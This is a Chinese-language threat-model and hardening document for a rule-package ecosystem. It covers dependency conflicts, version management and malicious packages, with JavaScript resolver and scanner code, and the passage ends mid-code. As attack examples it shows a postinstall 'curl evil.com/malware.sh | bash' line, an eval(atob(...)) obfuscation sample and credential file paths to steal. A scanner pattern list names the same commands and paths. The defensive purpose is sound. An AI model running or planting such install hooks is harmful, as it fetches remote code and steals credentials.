# 💥 混沌工程攻击向量 #5：规则包生态系统

规则包生态是 aiforge 的"应用商店"，类似于 npm、pip、cargo 等包管理器的生态。这个系统涉及：

1. 依赖解析：规则包之间的依赖关系
2. 版本管理：语义化版本、兼容性
3. 恶意包检测：安全审查、信任机制
4. 包发现：搜索、推荐、评分
5. 社区生态：贡献、维护、废弃

从攻击者角度思考：如果我想破坏这个生态系统，我会：
- 创建循环依赖让安装失败
- 发布恶意包窃取数据
- 抢注流行包名进行钓鱼
- 发布不兼容版本破坏现有项目
- 废弃关键包导致生态崩溃

这是一个高风险领域，因为涉及到用户信任和安全。

## 攻击前的生态系统梳理

```
规则包生态的核心流程:

用户视角:1. 发现包（搜索、推荐）
  2. 评估包（评分、文档、示例）
  3. 安装包（下载、依赖解析）
  4. 使用包（应用规则）
  5. 更新包（版本升级）
  6. 卸载包（清理）

维护者视角:
  1. 创建包（定义规则、编写文档）
  2. 发布包（上传到仓库）
  3. 维护包（修复 bug、添加功能）
  4. 废弃包（标记为过时）

平台视角:
  1. 托管包（存储、分发）
  2. 审查包（安全检查）
  3. 索引包（搜索、推荐）
  4. 监控包（使用统计、问题追踪）


当前假设的架构:
  - 知识仓库 = Git 仓库（GitLab/GitHub）
  - manifest.json = 包元数据
  - 没有中心化的包注册表（类似 npm registry）
  - 用户直接从 Git 仓库安装
```

---

## 💥 攻击场景 5.1：依赖解析的复杂性和失败

依赖解析是包管理器最复杂的部分。npm、pip 等都有大量的依赖解析 bug。主要问题：
1. 循环依赖
2. 版本冲突
3. 依赖地狱（dependency hell）
4. 幽灵依赖（phantom dependencies）
5. 传递依赖的版本约束

```
场景 A — 循环依赖
────────────────
  包 A 依赖 包 B
  包 B 依赖 包 C
  包 C 依赖 包 A
  用户安装包 A:
    → 需要 B
    → 需要 C
    → 需要 A（已经在安装中）
    → 无限循环

  问题:
    如果没有循环检测 → 栈溢出
    如果有循环检测 → 如何处理？
      - 报错？（用户无法使用）
      - 忽略？（可能缺少功能）
      - 警告？（用户困惑）


场景 B — 菱形依赖冲突
────────────────────

  包 A 依赖 包 C v1.0
  包 B 依赖 包 C v2.0
  用户同时需要 A 和 B

  问题:
    C v1.0 和 v2.0 不兼容
    → 无法同时满足

  可能的解决方案:
    1. 报错（用户无法使用）
    2. 选择一个版本（可能破坏另一个包）
    3. 安装两个版本（如何隔离？）
    4. 让用户选择（用户可能不懂）


场景 C — 版本约束冲突
────────────────────

  包 A: "dependencies": { "C": "^1.0.0" }
  包 B: "dependencies": { "C": "~1.5.0" }

  C 的可用版本: 1.0.0, 1.5.0, 1.6.0, 2.0.0

  问题:
    ^1.0.0 = 1.x.x（1.0.0 - 1.9.9）
    ~1.5.0 = 1.5.x（1.5.0 - 1.5.9）
    交集 = 1.5.x
  如果没有 1.5.x 版本:
    → 无解

  如果有多个 1.5.x 版本:
    → 选择哪个？（最新？最稳定？）


场景 D — 传递依赖的版本提升
──────────────────────────

  包 A 依赖 包 C v1.0
  包 B 依赖 包 C v1.5
  包 C v1.5 有安全漏洞

  用户安装 A 和 B:
    → 系统选择 C v1.5（满足两者）
    → 但 A 可能在 v1.5 上有 bug

  问题:
    传递依赖的版本被"提升"
    → 可能破坏依赖它的包


场景 E — 可选依赖的处理
──────────────────────

  包 A:
    "dependencies": { "B": "^1.0.0" }
    "optionalDependencies": { "C": "^2.0.0" }

  如果 C 安装失败:
    → A 应该继续安装（C 是可选的）
    → 但 A 的某些功能可能不可用

  问题:
    用户不知道哪些功能不可用
    → 运行时才发现错误


场景 F — 开发依赖 vs 生产依赖
────────────────────────────

  包 A:
    "dependencies": { "B": "^1.0.0" }
    "devDependencies": { "test-framework": "^3.0.0" }

  用户安装 A:
    → 应该安装 devDependencies 吗？

  问题:
    如果安装 → 浪费空间和时间
    如果不安装 → 用户无法运行测试


场景 G — 幽灵依赖
────────────────

  包 A 依赖 包 B
  包 B 依赖 包 C

  包 A 的代码中直接使用了 C（但没有声明依赖）

  问题:
    在当前环境可以工作（C 被 B 安装了）
    如果 B 移除了对 C 的依赖 → A 崩溃
    → 隐式依赖，难以发现


场景 H — 依赖解析的性能问题
──────────────────────────

  包 A 有 100 个依赖
  每个依赖又有 10 个依赖
  总共 1000+ 个包需要解析

  问题:
    版本约束求解是 NP 完全问题
    → 可能需要很长时间
    → 或者找不到解


场景 I — 依赖的平台特定性
────────────────────────

  包 A 在 Windows 上依赖 包 B
  包 A 在 Linux 上依赖 包 C

  manifest.json:
    "dependencies": {
      "B": "^1.0.0",  // Windows only
      "C": "^1.0.0"   // Linux only
    }

  问题:
    如何表达平台特定依赖？
    如果不支持 → 所有平台都安装所有依赖


场景 J — 依赖的条件性
────────────────────

  包 A 在启用某个功能时依赖 包 B
  manifest.json:
    "dependencies": {
      "B": "^1.0.0"  // 只在 feature-x 启用时需要
    }

  问题:
    如何表达条件依赖？
    如果不支持 → 总是安装（浪费）
```

### 加固方案

```javascript
// ============================================
// 依赖解析器（简化版 SAT Solver）
// ============================================
class DependencyResolver {
  constructor() {
    this.packages = new Map();  // 包名 -> 包信息
    this.resolved = new Map();  // 包名 -> 选中的版本
    this.resolving = new Set(); // 正在解析的包（循环检测）
  }

  // 解析依赖树
  async resolve(rootPackages) {
    console.log('🔍 解析依赖...\n');
  
    try {
      // 解析每个根包
      for (const pkg of rootPackages) {
        await this.resolvePackage(pkg.name, pkg.versionConstraint);
      }
    
      // 验证解析结果
      this.validateResolution();
    
      // 生成安装计划
      const plan = this.generateInstallPlan();
    
      console.log(`✓ 依赖解析完成: ${this.resolved.size} 个包\n`);
    
      return { resolved: this.resolved, plan };
    } catch (e) {
      if (e instanceof DependencyError) {
        throw e;
      }
      throw new DependencyError('依赖解析失败', e);
    }
  }

  // 解析单个包
  async resolvePackage(name, constraint, depth = 0) {
    // 深度限制（防止无限递归）
    if (depth > 100) {
      throw new DependencyError(`依赖深度超过限制: ${name}`);
    }
  
    // 循环依赖检测
    if (this.resolving.has(name)) {
      const cycle = Array.from(this.resolving).concat(name);
      throw new DependencyError(
        `检测到循环依赖: ${cycle.join(' → ')}`
      );
    }
  
    // 如果已经解析过，检查版本是否兼容
    if (this.resolved.has(name)) {
      const existing = this.resolved.get(name);
      if (!this.satisfiesConstraint(existing.version, constraint)) {
        throw new DependencyError(
          `版本冲突: ${name}\n` +
          `  已选择: ${existing.version}\n` +
          `  需要: ${constraint}`
        );
      }
      return existing;
    }
  
    // 标记为正在解析
    this.resolving.add(name);
  
    try {
      // 获取包信息
      const pkg = await this.fetchPackage(name);
    
      // 选择满足约束的版本
      const version = this.selectVersion(pkg.versions, constraint);
      if (!version) {
        throw new DependencyError(
          `找不到满足约束的版本: ${name}@${constraint}`
        );
      }
    
      // 记录选择
      this.resolved.set(name, {
        name,
        version: version.number,
        manifest: version.manifest,
      });
    
      // 递归解析依赖
      if (version.manifest.dependencies) {
        for (const [depName, depConstraint] of Object.entries(version.manifest.dependencies)) {
          await this.resolvePackage(depName, depConstraint, depth + 1);
        }
      }
    
      // 处理可选依赖（失败不阻塞）
      if (version.manifest.optionalDependencies) {
        for (const [depName, depConstraint] of Object.entries(version.manifest.optionalDependencies)) {
          try {
            await this.resolvePackage(depName, depConstraint, depth + 1);
          } catch (e) {
            warn(`⚠️  可选依赖安装失败: ${depName} (${e.message})`);
          }
        }
      }
    
      return this.resolved.get(name);
    
    } finally {
      // 移除解析标记
      this.resolving.delete(name);
    }
  }

  // 获取包信息（从注册表或 Git）
  async fetchPackage(name) {
    if (this.packages.has(name)) {
      return this.packages.get(name);
    }
  
    // 从注册表获取
    const pkg = await this.fetchFromRegistry(name);
    this.packages.set(name, pkg);
    return pkg;
  }

  // 选择版本（满足约束的最新版本）
  selectVersion(versions, constraint) {
    // 过滤满足约束的版本
    const candidates = versions.filter(v => 
      this.satisfiesConstraint(v.number, constraint)
    );
  
    if (candidates.length === 0) {
      return null;
    }
  
    // 选择最新的稳定版本
    const stable = candidates.filter(v => !v.prerelease);
    if (stable.length > 0) {
      return stable[stable.length - 1];  // 假设已排序
    }
  
    // 如果没有稳定版本，选择最新的预发布版本
    return candidates[candidates.length - 1];
  }

  // 检查版本是否满足约束
  satisfiesConstraint(version, constraint) {
    // 简化的语义化版本检查
    // 支持: ^1.0.0, ~1.0.0, >=1.0.0, 1.0.0
    if (constraint === '*' || constraint === 'latest') {
      return true;
    }
  
    if (constraint.startsWith('^')) {
      // ^1.2.3 = >=1.2.3 <2.0.0
      const base = constraint.slice(1);
      const [major] = base.split('.');
      return version.startsWith(major + '.');
    }
  
    if (constraint.startsWith('~')) {
      // ~1.2.3 = >=1.2.3 <1.3.0
      const base = constraint.slice(1);
      const [major, minor] = base.split('.');
      return version.startsWith(`${major}.${minor}.`);
    }
  
    if (constraint.startsWith('>=')) {
      const base = constraint.slice(2);
      return this.compareVersions(version, base) >= 0;
    }
  
    // 精确匹配
    return version === constraint;
  }

  // 比较版本号
  compareVersions(v1, v2) {
    const parts1 = v1.split('.').map(Number);
    const parts2 = v2.split('.').map(Number);
  
    for (let i = 0; i < 3; i++) {
      if (parts1[i] > parts2[i]) return 1;
      if (parts1[i] < parts2[i]) return -1;
    }
  
    return 0;
  }

  // 验证解析结果
  validateResolution() {
    // 检查是否有未解析的依赖
    for (const [name, pkg] of this.resolved) {
      if (pkg.manifest.dependencies) {
        for (const depName of Object.keys(pkg.manifest.dependencies)) {
          if (!this.resolved.has(depName)) {
            throw new DependencyError(
              `包 ${name} 的依赖 ${depName} 未解析`
            );
          }
        }
      }
    }
  }

  // 生成安装计划（拓扑排序）
  generateInstallPlan() {
    const plan = [];
    const visited = new Set();
    const visiting = new Set();
  
    const visit = (name) => {
      if (visited.has(name)) return;
      if (visiting.has(name)) {
        throw new DependencyError(`循环依赖: ${name}`);
      }
    
      visiting.add(name);
    
      const pkg = this.resolved.get(name);
      if (pkg.manifest.dependencies) {
        for (const depName of Object.keys(pkg.manifest.dependencies)) {
          visit(depName);
        }
      }
    
      visiting.delete(name);
      visited.add(name);
      plan.push(name);
    };
  
    // 访问所有包
    for (const name of this.resolved.keys()) {
      visit(name);
    }
  
    return plan;
  }

  // 从注册表获取包（模拟）
  async fetchFromRegistry(name) {
    // 实际实现应该从 GitLab/GitHub API 获取
    // 这里返回模拟数据
    return {
      name,
      versions: [
        { number: '1.0.0', manifest: { dependencies: {} } },
        { number: '1.5.0', manifest: { dependencies: {} } },
        { number: '2.0.0', manifest: { dependencies: {} } },
      ],
    };
  }
}


// ============================================
// 依赖冲突解决器（高级）
// ============================================
class ConflictResolver {
  constructor(strategy = 'latest-compatible') {
    this.strategy = strategy;
  }

  // 解决菱形依赖冲突
  resolveDiamondConflict(pkgA, pkgB, commonDep) {
    const constraintA = pkgA.dependencies[commonDep];
    const constraintB = pkgB.dependencies[commonDep];
  
    // 策略 1: 选择最新的兼容版本
    if (this.strategy === 'latest-compatible') {
      const intersection = this.findVersionIntersection(
        constraintA,
        constraintB
      );
    
      if (intersection.length === 0) {
        throw new DependencyError(
          `无法解决冲突: ${commonDep}\n` +
          `  ${pkgA.name} 需要: ${constraintA}\n` +
          `  ${pkgB.name} 需要: ${constraintB}`
        );
      }
    
      return intersection[intersection.length - 1];  // 最新版本
    }
  
    // 策略 2: 安装多个版本（隔离）
    if (this.strategy === 'multiple-versions') {
      return {
        [pkgA.name]: this.selectVersion(constraintA),
        [pkgB.name]: this.selectVersion(constraintB),
      };
    }
  
    // 策略 3: 让用户选择
    if (this.strategy === 'ask-user') {
      return this.promptUser(pkgA, pkgB, commonDep);
    }}

  // 查找版本交集
  findVersionIntersection(constraintA, constraintB) {
    // 简化实现：找到同时满足两个约束的版本
    const allVersions = this.getAllVersions();
  
    return allVersions.filter(v => 
      this.satisfiesConstraint(v, constraintA) &&
      this.satisfiesConstraint(v, constraintB)
    );
  }
}


// ============================================
// 平台特定依赖支持
// ============================================
class PlatformDependencies {
  constructor(platform = os.platform()) {
    this.platform = platform;
  }

  // 过滤平台特定依赖
  filterDependencies(manifest) {
    const filtered = {};
  
    for (const [name, constraint] of Object.entries(manifest.dependencies || {})) {
      // 检查是否有平台限制
      if (manifest.platformDependencies) {
        const platformSpec = manifest.platformDependencies[name];
      
        if (platformSpec && !platformSpec.includes(this.platform)) {
          continue;  // 跳过不适用的依赖
        }
      }
    
      filtered[name] = constraint;
    }
  
    return filtered;
  }
}


// ============================================
// 使用示例
// ============================================
async function installPackages(packageNames) {
  const resolver = new DependencyResolver();

  try {
    // 解析依赖
    const { resolved, plan } = await resolver.resolve(
      packageNames.map(name => ({ name, versionConstraint: 'latest' }))
    );
  
    // 显示安装计划
    console.log('📦 安装计划:');
    plan.forEach((name, index) => {
      const pkg = resolved.get(name);
      console.log(`  ${index + 1}. ${name}@${pkg.version}`);
    });
    console.log('');
  
    // 执行安装
    for (const name of plan) {
      const pkg = resolved.get(name);
      await installPackage(pkg);
    }
  
    console.log('✅ 安装完成\n');
  
  } catch (e) {
    if (e instanceof DependencyError) {
      console.error(`❌ 依赖解析失败:\n${e.message}\n`);
    
      // 提供解决建议
      console.log('💡 可能的解决方案:');
      console.log('  1. 检查包的版本约束是否过于严格');
      console.log('  2. 更新依赖到兼容的版本');
      console.log('  3. 联系包维护者解决冲突\n');
    } else {
      throw e;
    }
  }
}


// 依赖错误类
class DependencyError extends Error {
  constructor(message, cause) {
    super(message);
    this.name = 'DependencyError';
    this.cause = cause;
  }
}
```

---

## 💥 攻击场景 5.2：版本管理的混乱

版本管理是生态系统的基础。如果版本管理混乱，整个生态都会崩溃。主要问题：
1. 语义化版本的违反
2. 破坏性变更没有标记
3. 版本回退和撤回
4. 预发布版本的处理
5. 版本锁定和更新策略

```
场景 A — 语义化版本违反
──────────────────────
  包 A v1.5.0 → v1.5.1（补丁版本）
  但实际上包含了破坏性变更

  用户项目:"dependencies": { "A": "^1.5.0" }
    → 自动更新到 v1.5.1
    → 项目崩溃
  问题:
    用户信任语义化版本
    维护者违反了约定
    → 信任破裂


场景 B — 破坏性变更没有标记
──────────────────────────

  包 A v1.9.9 → v2.0.0
  CHANGELOG 没有说明破坏性变更

  用户升级:
    → 不知道需要修改代码
    → 运行时才发现错误

  问题:缺少迁移指南
    用户不知道如何升级


场景 C — 版本撤回和回退
──────────────────────

  包 A v2.0.0 发布后发现严重 bug
  维护者撤回 v2.0.0

  已经安装 v2.0.0 的用户:
    → 不知道版本被撤回
    → 继续使用有 bug 的版本

  问题:
    如何通知用户？
    如何强制降级？


场景 D — 预发布版本的混乱
────────────────────────

  包 A 的版本:
    1.0.0, 1.1.0-alpha, 1.1.0-beta, 1.1.0-rc1, 1.1.0

  用户: "dependencies": { "A": "^1.0.0" }

  问题:
    ^1.0.0 应该匹配预发布版本吗？
    如果匹配 → 用户可能安装不稳定版本
    如果不匹配 → 用户无法测试新功能


场景 E — 版本锁定的困境
──────────────────────

  项目使用 lockfile（类似 package-lock.json）
  锁定了所有依赖的精确版本

  优点: 可重现构建
  缺点: 无法自动获取安全更新

  场景:
    包 A v1.5.0 有安全漏洞
    修复在 v1.5.1
    但 lockfile 锁定了 v1.5.0
    → 用户不知道有安全漏洞


场景 F — 版本范围的歧义
──────────────────────

  不同的包管理器对版本范围的理解不同:
  npm: ^1.2.3 = >=1.2.3 <2.0.0
  pip: ~=1.2.3 = >=1.2.3 <1.3.0
  cargo: 1.2.3 = ^1.2.3

  如果 aiforge 使用不同的规则:→ 用户困惑
    → 迁移困难


场景 G — 版本号耗尽
──────────────────

  包 A 已经到了 v999.0.0
  下一个版本应该是什么？

  问题:
    语义化版本没有上限
    但实际系统可能有限制


场景 H — 日期版本 vs 语义版本
────────────────────────────

  有些包使用日期版本: 2024.01.15
  有些包使用语义版本: 1.2.3

  问题:
    如何比较？
    如何表达依赖？


场景 I — 版本别名
────────────────

  包 A:
    v1.0.0 (stable)
    v2.0.0-beta (latest)

  用户: "dependencies": { "A": "latest" }

  问题:
    "latest" 应该是 stable 还是 beta？
    不同用户可能有不同期望
```

### 加固方案

```javascript
// ============================================
// 语义化版本管理器
// ============================================
class SemanticVersionManager {
  // 解析版本号
  static parse(versionString) {
    const match = versionString.match(
      /^(\d+)\.(\d+)\.(\d+)(?:-([a-zA-Z0-9.-]+))?(?:\+([a-zA-Z0-9.-]+))?$/
    );
  
    if (!match) {
      throw new Error(`无效的版本号: ${versionString}`);
    }
  
    return {
      major: parseInt(match[1]),
      minor: parseInt(match[2]),
      patch: parseInt(match[3]),
      prerelease: match[4] || null,
      build: match[5] || null,
      original: versionString,
    };
  }

  // 比较版本
  static compare(v1, v2) {
    const parsed1 = this.parse(v1);
    const parsed2 = this.parse(v2);
  
    // 比较主版本号
    if (parsed1.major !== parsed2.major) {
      return parsed1.major - parsed2.major;
    }
  
    // 比较次版本号
    if (parsed1.minor !== parsed2.minor) {
      return parsed1.minor - parsed2.minor;
    }
  
    // 比较补丁版本号
    if (parsed1.patch !== parsed2.patch) {
      return parsed1.patch - parsed2.patch;
    }
  
    // 比较预发布版本
    if (parsed1.prerelease && !parsed2.prerelease) return -1;
    if (!parsed1.prerelease && parsed2.prerelease) return 1;
    if (parsed1.prerelease && parsed2.prerelease) {
      return parsed1.prerelease.localeCompare(parsed2.prerelease);
    }
  
    return 0;
  }

  // 检查是否满足约束
  static satisfies(version, constraint) {
    if (constraint === '*' || constraint === 'latest') {
      return true;
    }
  
    // ^1.2.3 = >=1.2.3 <2.0.0
    if (constraint.startsWith('^')) {
      const base = this.parse(constraint.slice(1));
      const v = this.parse(version);
      return v.major === base.major &&
             (v.minor > base.minor || 
              (v.minor === base.minor && v.patch >= base.patch));
    }
  
    // ~1.2.3 = >=1.2.3 <1.3.0
    if (constraint.startsWith('~')) {
      const base = this.parse(constraint.slice(1));
      const v = this.parse(version);
    
      return v.major === base.major &&
             v.minor === base.minor &&
             v.patch >= base.patch;
    }

    // >=1.2.3
    if (constraint.startsWith('>=')) {
      return this.compare(version, constraint.slice(2)) >= 0;
    }
  
    // <=1.2.3
    if (constraint.startsWith('<=')) {
      return this.compare(version, constraint.slice(2)) <= 0;
    }
  
    // >1.2.3
    if (constraint.startsWith('>')) {
      return this.compare(version, constraint.slice(1)) > 0;
    }
  
    // <1.2.3
    if (constraint.startsWith('<')) {
      return this.compare(version, constraint.slice(1)) < 0;
    }
  
    // 精确匹配
    return version === constraint;
  }

  // 检查是否是破坏性变更
  static isBreakingChange(from, to) {
    const v1 = this.parse(from);
    const v2 = this.parse(to);
  
    // 主版本号变化 = 破坏性变更
    return v2.major > v1.major;
  }

  // 检查是否是预发布版本
  static isPrerelease(version) {
    const parsed = this.parse(version);
    return parsed.prerelease !== null;
  }

  // 获取下一个版本
  static bump(version, type) {
    const parsed = this.parse(version);
  
    switch (type) {
      case 'major':
        return `${parsed.major + 1}.0.0`;
      case 'minor':
        return `${parsed.major}.${parsed.minor + 1}.0`;
      case 'patch':
        return `${parsed.major}.${parsed.minor}.${parsed.patch + 1}`;
      default:
        throw new Error(`未知的版本类型: ${type}`);
    }
  }
}


// ============================================
// 版本撤回和废弃管理
// ============================================
class VersionDeprecation {
  constructor() {
    this.deprecated = new Map();  // 版本 -> 原因
    this.yanked = new Set();      // 已撤回的版本
  }

  // 标记版本为废弃
  deprecate(packageName, version, reason) {
    const key = `${packageName}@${version}`;
    this.deprecated.set(key, {
      reason,
      deprecatedAt: new Date(),
      alternative: null,
    });
  
    log(`⚠️  ${key} 已标记为废弃: ${reason}`);
  }

  // 撤回版本（严重问题）
  yank(packageName, version, reason) {
    const key = `${packageName}@${version}`;
    this.yanked.add(key);
  
    warn(`🚨 ${key} 已撤回: ${reason}`);
    warn(`   请立即升级到其他版本！`);
  }

  // 检查版本状态
  checkVersion(packageName, version) {
    const key = `${packageName}@${version}`;
  
    if (this.yanked.has(key)) {
      throw new Error(
        `版本已撤回: ${key}\n` +
        `此版本存在严重问题，不应使用`
      );
    }
  
    if (this.deprecated.has(key)) {
      const info = this.deprecated.get(key);
      warn(`⚠️  ${key} 已废弃: ${info.reason}`);
      if (info.alternative) {
        warn(`   建议使用: ${info.alternative}`);
      }
    }
  }
}


// ============================================
// 版本锁定文件（Lockfile）
// ============================================
class Lockfile {
  constructor(projectRoot) {
    this.projectRoot = projectRoot;
    this.lockfilePath = path.join(projectRoot, 'aiforge-lock.json');
    this.locks = {};
  }

  // 加载锁定文件
  load() {
    if (!fs.existsSync(this.lockfilePath)) {
      return {};
    }
  
    const content = fs.readFileSync(this.lockfilePath, 'utf8');
    this.locks = JSON.parse(content);
    return this.locks;
  }

  // 保存锁定文件
  save(resolved) {
    const locks = {};
  
    for (const [name, pkg] of resolved) {
      locks[name] = {
        version: pkg.version,
        resolved: pkg.resolved,  // 下载 URL
        integrity: pkg.integrity,  // SHA-256 hash
        dependencies: pkg.manifest.dependencies || {},
      };
    }
  
    fs.writeFileSync(
      this.lockfilePath,
      JSON.stringify(locks, null, 2),
      'utf8'
    );
  
    log(`✓ 锁定文件已更新: ${this.lockfilePath}`);
  }

  // 检查是否需要更新
  needsUpdate(resolved) {
    const current = this.load();
  
    for (const [name, pkg] of resolved) {
      if (!current[name]) {
        return true;  // 新增包
      }
    
      if (current[name].version !== pkg.version) {
        return true;  // 版本变化
      }
    }
  
    return false;
  }

  // 检查安全漏洞
  async checkVulnerabilities() {
    const current = this.load();
    const vulnerabilities = [];
  
    for (const [name, lock] of Object.entries(current)) {
      const vulns = await this.fetchVulnerabilities(name, lock.version);
      if (vulns.length > 0) {
        vulnerabilities.push({ package: name, version: lock.version, vulns });
      }
    }
  
    if (vulnerabilities.length > 0) {
      console.log('🚨 发现安全漏洞:\n');
      vulnerabilities.forEach(({ package: pkg, version, vulns }) => {
        console.log(`  ${pkg}@${version}:`);
        vulns.forEach(v => {
          console.log(`    - ${v.severity}: ${v.title}`);
          console.log(`      修复版本: ${v.fixedIn}`);
        });
      });console.log('');
    }
  
    return vulnerabilities;
  }

  // 获取漏洞信息（模拟）
  async fetchVulnerabilities(name, version) {
    // 实际应该从安全数据库查询
    return [];
  }
}


// ============================================
// 版本更新策略
// ============================================
class UpdateStrategy {
  constructor(strategy = 'conservative') {
    this.strategy = strategy;
  }

  // 检查可用更新
  async checkUpdates(installed) {
    const updates = [];
  
    for (const [name, current] of installed) {
      const available = await this.fetchLatestVersion(name);
    
      if (this.shouldUpdate(current.version, available.version)) {
        updates.push({
          package: name,
          current: current.version,
          available: available.version,
          type: this.getUpdateType(current.version, available.version),
        });
      }
    }
  
    return updates;
  }

  // 判断是否应该更新
  shouldUpdate(current, available) {
    const comparison = SemanticVersionManager.compare(available, current);
  
    if (comparison <= 0) {
      return false;  // 可用版本不比当前版本新
    }
  
    switch (this.strategy) {
      case 'conservative':
        // 只更新补丁版本
        return !SemanticVersionManager.isBreakingChange(current, available) &&
               this.isSameMinor(current, available);
    
      case 'moderate':
        // 更新补丁和次版本
        return !SemanticVersionManager.isBreakingChange(current, available);
    
      case 'aggressive':
        // 更新所有版本
        return true;
      case 'security-only':
        // 只更新有安全修复的版本
        return this.hasSecurityFix(current, available);
    
      default:
        return false;
    }
  }

  // 获取更新类型
  getUpdateType(from, to) {
    if (SemanticVersionManager.isBreakingChange(from, to)) {
      return 'major';
    }
  
    const v1 = SemanticVersionManager.parse(from);
    const v2 = SemanticVersionManager.parse(to);
  
    if (v2.minor > v1.minor) {
      return 'minor';
    }
  
    return 'patch';
  }

  // 检查是否是相同的次版本
  isSameMinor(v1, v2) {
    const parsed1 = SemanticVersionManager.parse(v1);
    const parsed2 = SemanticVersionManager.parse(v2);
  
    return parsed1.major === parsed2.major &&
           parsed1.minor === parsed2.minor;
  }

  // 检查是否有安全修复（模拟）
  async hasSecurityFix(from, to) {
    // 实际应该查询安全数据库
    return false;
  }

  // 获取最新版本（模拟）
  async fetchLatestVersion(name) {
    return { version: '1.0.0' };
  }
}
```

---

## 💥 攻击场景 5.3：恶意包和安全威胁

这是最危险的攻击向量。恶意包可以：
1. 窃取敏感数据（密钥、Token）
2. 植入后门
3. 挖矿
4. 破坏系统
5. 钓鱼攻击

npm 生态已经有多次恶意包事件，我们必须从中吸取教训。

```
场景 A — 名称抢注（Typosquatting）
────────────────────────────────
  流行包: "ai-prompts"
  恶意包: "ai-prompt"（少一个 s）

  用户打错字:
    aiforge install ai-prompt
    → 安装了恶意包
    → 窃取 API 密钥

  问题:
    用户很难发现拼写错误
    恶意包可能有相似的描述


场景 B — 依赖混淆攻击
────────────────────

  公司内部包: "internal-prompts"（私有仓库）
  恶意包: "internal-prompts"（公开仓库）

  如果公开仓库优先级更高:
    → 安装了恶意包而不是内部包
    → 窃取公司数据

  问题:
    包名冲突
    优先级不明确


场景 C — 供应链攻击
──────────────────

  流行包 A 被黑客接管
  黑客发布 A v2.0.0（包含恶意代码）

  所有依赖 A 的项目:
    → 自动更新到 v2.0.0
    → 被植入后门

  问题:
    信任链被破坏
    影响范围巨大


场景 D — 安装脚本攻击
────────────────────

  包 A 的 manifest.json:
    "postinstall": "curl evil.com/malware.sh | bash"

  用户安装包 A:
    → 自动执行恶意脚本
    → 窃取数据或植入后门

  问题:
    安装脚本有完整的系统权限
    用户可能不知道脚本在做什么


场景 E — 代码混淆
────────────────恶意包使用高度混淆的代码:
    eval(atob("ZXZpbCBjb2Rl..."))

  问题:
    难以审查
    静态分析工具可能无法检测


场景 F — 延迟激活
────────────────

  恶意包在安装后不立即执行
  而是等待特定条件:
    - 特定日期（定时炸弹）
    - 特定环境变量
    - 特定文件存在

  问题:
    初期测试无法发现
    大规模部署后才爆发


场景 G — 数据泄露
────────────────

  恶意包读取敏感文件:
    ~/.ssh/id_rsa
    ~/.aws/credentials
    .env 文件

  然后发送到远程服务器

  问题:
    用户可能不知道数据被窃取
    直到账户被盗用


场景 H — 包劫持
──────────────

  维护者账户被盗黑客发布恶意版本

  或者:
    维护者出售包的所有权
    新所有者植入恶意代码

  问题:
    用户信任原维护者
    不知道所有权已变更


场景 I — 社会工程
────────────────

  恶意包伪装成有用的工具:
    "ai-prompt-optimizer"（声称优化 prompt）
    "gitlab-token-manager"（声称管理 Token）

  实际上窃取用户数据

  问题:
    用户被功能描述吸引
    没有仔细审查代码


场景 J — 零日漏洞利用
────────────────────

  恶意包利用 aiforge 本身的漏洞:
    - 路径遍历
    - 命令注入
    - 权限提升

  问题:
    即使用户谨慎，也可能被攻击
    需要及时修复漏洞
```

### 加固方案

```javascript
// ============================================
// 包安全扫描器
// ============================================
class PackageSecurityScanner {
  constructor() {
    this.rules = this.loadSecurityRules();
    this.knownMalicious = new Set();
    this.trustedPublishers = new Set();
  }

  // 扫描包
  async scan(packageName, version, manifest) {
    const issues = [];
  
    // 1. 检查是否在恶意包列表中
    if (this.knownMalicious.has(`${packageName}@${version}`)) {
      issues.push({
        severity: 'critical',
        type: 'known-malicious',
        message: '此包已被标记为恶意包',});
    }
  
    // 2. 检查包名相似性（Typosquatting）
    const similar = this.findSimilarPackages(packageName);
    if (similar.length > 0) {
      issues.push({
        severity: 'warning',
        type: 'typosquatting',
        message: `包名与以下流行包相似: ${similar.join(', ')}`,
      });
    }
  
    // 3. 检查安装脚本
    if (manifest.scripts) {
      const scriptIssues = this.scanScripts(manifest.scripts);
      issues.push(...scriptIssues);
    }
  
    // 4. 检查权限请求
    if (manifest.permissions) {
      const permIssues = this.scanPermissions(manifest.permissions);
      issues.push(...permIssues);
    }
  
    // 5. 检查网络请求
    const networkIssues = await this.scanNetworkActivity(packageName, version);
    issues.push(...networkIssues);
  
    // 6. 检查文件访问
    const fileIssues = await this.scanFileAccess(packageName, version);
    issues.push(...fileIssues);
  
    // 7. 检查代码混淆
    const obfuscationIssues = await this.scanObfuscation(packageName, version);
    issues.push(...obfuscationIssues);
  
    return {
      safe: issues.filter(i => i.severity === 'critical').length === 0,
      issues,
    };
  }

  // 检查包名相似性
  findSimilarPackages(name) {
    const popular = [
      'ai-prompts',
      'gitlab-auth',
      'aiforge-utils',
      // ... 更多流行包
    ];
  
    const similar = [];
    for (const pkg of popular) {
      if (this.isSimilar(name, pkg)) {
        similar.push(pkg);
      }
    }
  
    return similar;
  }

  // 计算字符串相似度（Levenshtein 距离）
  isSimilar(s1, s2) {
    const distance = this.levenshteinDistance(s1, s2);
    return distance <= 2;  // 最多 2 个字符差异
  }

  levenshteinDistance(s1, s2) {
    const matrix = [];
  
    for (let i = 0; i <= s2.length; i++) {
      matrix[i] = [i];
    }
  
    for (let j = 0; j <= s1.length; j++) {
      matrix[0][j] = j;
    }
  
    for (let i = 1; i <= s2.length; i++) {
      for (let j = 1; j <= s1.length; j++) {
        if (s2.charAt(i - 1) === s1.charAt(j - 1)) {
          matrix[i][j] = matrix[i - 1][j - 1];
        } else {
          matrix[i][j] = Math.min(
            matrix[i - 1][j - 1] + 1,
            matrix[i][j - 1] + 1,
            matrix[i - 1][j] + 1
          );
        }
      }
    }
  
    return matrix[s2.length][s1.length];
  }

  // 扫描安装脚本
  scanScripts(scripts) {
    const issues = [];
    const dangerousPatterns = [
      /curl.*\|.*bash/i,
      /wget.*\|.*sh/i,
      /eval\(/i,
      /exec\(/i,
      /child_process/i,
      /\.ssh/i,
      /\.aws/i,
      /\.env/i,
    ];
  
    for (const [name, script] of Object.entries(scripts)) {
      for (const pattern of dangerousPatterns) {
        if (pattern.test(script)) {
          issues.push({
            severity: 'critical',
            type: 'dangerous-script',
            message: `安装脚本 "${name}" 包含危险操作: ${script}`,
          });
        }
      }
    }
  
    return issues;
  }

  // 扫描权限请求
  scanPermissions(permissions) {
    const issues = [];
    const dangerousPerms = [
      'filesystem:write-all',
      'network:unrestricted',
      'process:spawn',
      'env:read-all',
    ];
  
    for (const perm of permissions) {
      if (dangerousPerms.includes(perm)) {
        issues.push({
          severity: 'warning',
          type: 'dangerous-permission',
